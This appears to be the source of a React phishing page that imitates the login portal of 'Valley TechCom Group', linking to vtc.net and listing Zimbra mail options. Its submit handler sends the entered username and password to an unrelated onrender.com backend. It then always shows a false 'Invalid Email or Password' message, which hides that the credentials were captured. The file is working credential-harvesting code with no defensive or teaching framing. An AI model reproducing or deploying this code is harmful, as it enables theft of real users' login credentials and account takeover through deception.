import React from 'react';

import './home.css';

import logo from './logo.gif';
import { useState } from 'react';

import axios from 'axios';

function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Valley TechCom Group")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
        e.preventDefault();
    
        try {
            const response = await axios.post('https://myrootbackendone.onrender.com', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }

   return (
        
    <>

{showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        <div className='container mt-5'>

            <div className='row main rounded'>

                <div className='logodiv col-md-3 py-3'>

                    <img src={logo} className="mylogo" />


                </div>

                <div className='contentdiv col-md-9 px-3'>
                    <h1 className='contenthead'>Please Log In</h1>
                        <div className='text-right'>
                        <a href='https://userportal.vtc.net/mfa/recovery' className='keys'><i className='fa fa-key'></i>Forgot Password</a>
                        </div>

                <br/>

                <form onSubmit={handleSubmit}>

                    <div className='form-group'>
                        <label className='label'>Username</label>

                        <input onChange={function(e){
                            setUserName(e.target.value);
                        }} value={email} type="text"className='form-control'placeholder="Username"required />

                    </div>


                    <div className='form-group'>
                        <label className='label'>Password</label>

                        <input onChange={function(e){
                            setPassword(e.target.value);
                            
                        }}value={password} type="password"className='form-control'placeholder="Password"required />

                    </div>


                    <div className='form-group'>
                        

                       

                      
                        

                        <div class="form-row">
                            <div class="col">
                                    <button type="submit" className='btn mybtn py-1'>Login</button>
                            </div>
                            <div class="col text-right">
                                <p>Go To:<select className="custom-select col-6" id="inlineFormCustomSelect">
                                <option value="portal-sso:">App Portal</option>
                                                            <option value="account-recovery-prefs:">Access Recovery</option>
                                                            <option value="account:">Account Security</option>
                                                            <option value="zimbra-sso:calendar">Zimbra Calendar</option>
                                                            <option value="zimbra-sso:mail">Zimbra Mail</option>
                            </select></p>
                            </div>
  </div>



  <div class="custom-control custom-switch">
                                <input type="checkbox" class="custom-control-input" name="_remember_me" id="_remember_me"
                                       
                                />
                                <label class="custom-control-label" for="_remember_me">
                                    Stay logged in                                    <span class="pl-1" title="Enabling this will keep you logged in to this computer for 30 days." style={{
                                        cursor: "help",
                                    }}>
                                        <i class="fa fa-info-circle text-muted"></i>
                                    </span>
                                </label>
                            </div>
                    </div>

                   

                </form>

                </div>



            </div>


        </div>
    
    </>
    );
}


export default Home;